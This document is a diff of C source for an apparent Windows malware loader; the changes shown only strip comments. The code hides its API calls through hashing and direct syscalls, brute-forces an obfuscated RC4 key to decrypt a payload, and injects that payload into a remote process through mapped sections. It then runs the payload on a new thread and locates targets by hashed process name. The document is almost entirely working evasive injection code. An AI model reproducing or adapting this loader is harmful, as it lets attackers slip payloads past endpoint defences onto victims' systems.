@@ -5,22 +5,18 @@
 
 UCHAR ProtectedKey[] = { 0x36, 0x26, 0x54, 0x7A, 0x42, 0xFA, 0x3B, 0x72, 0xBF, 0x35, 0x45, 0x2C, 0xBD, 0x80, 0x76, 0x87 };
 
-// global `VX_TABLE` structure
 VX_TABLE 	g_Sys = { 0 };
 API_HASHING g_Api = { 0 };
 
 BOOL InitializeSyscalls() {
 
-	// Get the PEB
 	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
 	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
 	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
 		return FALSE;
 
-	// Get NTDLL module
 	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
 
-	// Get the EAT of NTDLL
 	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
 	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
 		return FALSE;
@@ -34,7 +30,6 @@ BOOL InitializeSyscalls() {
 	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
 	g_Sys.NtDelayExecution.uHash = NtDelayExecution_JOAA;
 
-	// Initialize the syscalls
 	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateSection))
 		return FALSE;
 	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtMapViewOfSection))
@@ -52,7 +47,6 @@ BOOL InitializeSyscalls() {
 	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))
 		return FALSE;
 
-	//	User32.dll exported
 	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
 	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
 	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
@@ -62,7 +56,6 @@ BOOL InitializeSyscalls() {
 	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
 		return FALSE;
 
-	// 	Kernel32.dll exported
 	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
 	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
 	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
@@ -77,17 +70,13 @@ BOOL InitializeSyscalls() {
 
 BOOL Rc4EncryptionViSystemFunc032(PBYTE pRc4Key, PBYTE pPayloadData, DWORD dwRc4KeySize, DWORD sPayloadSize) {
 
-	// The return of SystemFunction032
 	NTSTATUS        	STATUS = NULL;
 	BYTE			RealKey[KEY_SIZE] = { 0 };
 	int			    b = 0;
 
-	// Brute forcing the key:
 	while (1) {
-		// Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key
 		if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
 			break;
-		// Else, increment 'b' and try again
 		else
 			b++;
 	}
@@ -96,20 +85,15 @@ BOOL Rc4EncryptionViSystemFunc032(PBYTE pRc4Key, PBYTE pPayloadData, DWORD dwRc4
 	PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);
 #endif
 
-	// Decrypting the key
 	for (int i = 0; i < KEY_SIZE; i++) {
 		RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
 	}
 
-	// Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
 	USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
 		Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };
 
-	// Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the process,
-	// And using its return as the hModule parameter in GetProcAddress
 	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryH("Advapi32"), SystemFunction032_JOAA);
 
-	// If SystemFunction032 calls failed it will return non zero value
 	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
 #ifdef DEBUG
 		PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
@@ -136,8 +120,6 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 
 	DWORD           dwLocalFlag = PAGE_READWRITE;
 
-	//--------------------------------------------------------------------------
-	// Allocating local map view
 	ConfS(g_Sys.NtCreateSection.wSysC);
 	if ((STATUS = RunSys(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
 #ifdef DEBUG
@@ -162,16 +144,12 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);
 #endif
 
-	//--------------------------------------------------------------------------
-	// Writing the payload
 	Rc4EncryptionViSystemFunc032(ProtectedKey, pPayload, KEY_SIZE, sPayloadSize);
 	_memcpy(pLocalAddress, pPayload, sPayloadSize);
 #ifdef DEBUG
 	PRINTA("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);
 #endif
 
-	//--------------------------------------------------------------------------
-		// Allocating remote map view
 	if (!bLocal) {
 
 		ConfS(g_Sys.NtMapViewOfSection.wSysC);
@@ -188,8 +166,6 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 
 	}
 
-	//--------------------------------------------------------------------------
-	// Executing the payload via thread creation
 	pExecAddress = pRemoteAddress;
 	if (bLocal) {
 		pExecAddress = pLocalAddress;
@@ -208,8 +184,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	PRINTA("[+] DONE \n");
 	PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
 #endif
-	//--------------------------------------------------------------------------
-	// Waiting for the thread to finish
+
 	ConfS(g_Sys.NtWaitForSingleObject.wSysC);
 	if ((STATUS = RunSys(hThread, FALSE, NULL)) != 0) {
 #ifdef DEBUG
@@ -218,7 +193,6 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		return FALSE;
 	}
 
-	// Unmapping the local view
 	ConfS(g_Sys.NtUnmapViewOfSection.wSysC);
 	if ((STATUS = RunSys((HANDLE)-1, pLocalAddress)) != 0) {
 #ifdef DEBUG
@@ -227,7 +201,6 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		return FALSE;
 	}
 
-	// Closing the section handle
 	ConfS(g_Sys.NtClose.wSysC);
 	if ((STATUS = RunSys(hSection)) != 0) {
 #ifdef DEBUG
@@ -247,20 +220,16 @@ BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess
 	PVOID					    pValueToFree = NULL;
 	NTSTATUS				    STATUS = NULL;
 
-	// This will fail with status = STATUS_INFO_LENGTH_MISMATCH, but that's ok, because we need to know how much to allocate (uReturnLen1)
 	ConfS(g_Sys.NtQuerySystemInformation.wSysC);
 	RunSys(SystemProcessInformation, NULL, NULL, &uReturnLen1);
 
-	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
 	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
 	if (SystemProcInfo == NULL) {
 		return FALSE;
 	}
 
-	// Since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
 	pValueToFree = SystemProcInfo;
 
-	// Calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'
 	ConfS(g_Sys.NtQuerySystemInformation.wSysC);
 	STATUS = RunSys(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
 	if (STATUS != 0x0) {
@@ -272,27 +241,20 @@ BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess
 
 	while (TRUE) {
 
-		// Small check for the process's name size
-		// Comparing the enumerated process name to what we want to target
 		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == szProcName) {
-			// Opening a handle to the target process and saving it, then breaking
 			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
 			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
 			break;
 		}
 
-		// If NextEntryOffset is 0, we reached the end of the array
 		if (!SystemProcInfo->NextEntryOffset)
 			break;
 
-		// Moving to the next element in the array
 		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
 	}
 
-	// Freeing using the initial address
 	HeapFree(GetProcessHeap(), 0, pValueToFree);
 
-	// Checking if we got the target's process handle
 	if (*pdwPid == NULL || *phProcess == NULL)
 		return FALSE;
 	else
